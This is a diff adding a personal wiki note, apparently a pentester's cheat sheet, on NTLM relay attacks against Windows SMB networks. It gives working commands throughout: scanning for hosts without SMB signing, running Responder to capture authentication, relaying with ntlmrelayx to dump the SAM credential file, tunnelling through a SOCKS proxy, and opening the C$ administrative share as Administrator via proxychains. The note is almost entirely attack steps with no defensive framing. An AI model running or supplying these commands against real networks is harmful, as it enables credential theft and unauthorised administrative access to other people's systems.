@@ -1,0 +1,27 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-10-30T13:00:40-07:00
+
+====== NTLM Relay ======
+Created Friday 30 October 2020
+
+Vulnerable if message_signing: disabled:
+# nmap -n -Pn -p 445 --script smbsecurity-
+mode 10.5.23.0/24
+Disable SMB and HTTP in Responder.conf and
+start Responder:
+# ./Responder.py -I eth0
+NTLM Relay to target and extract SAM file:
+# ./ntlmrelayx.py -smb2support -t
+smb://10.5.23.42
+NTLM Relay using socks proxy:
+# ./ntlmrelayx.py -tf targets.txt
+-smb2support -socks
+Configure ProxyChains:
+# vi /etc/proxychains.conf
+[...]
+socks4 127.0.0.1 1080
+Access files via SOCKS proxy:
+# proxychains smbclient -m smb3
+'\\10.5.23.42\C$' -W pc05 -U
+Administrator%invalidPwd
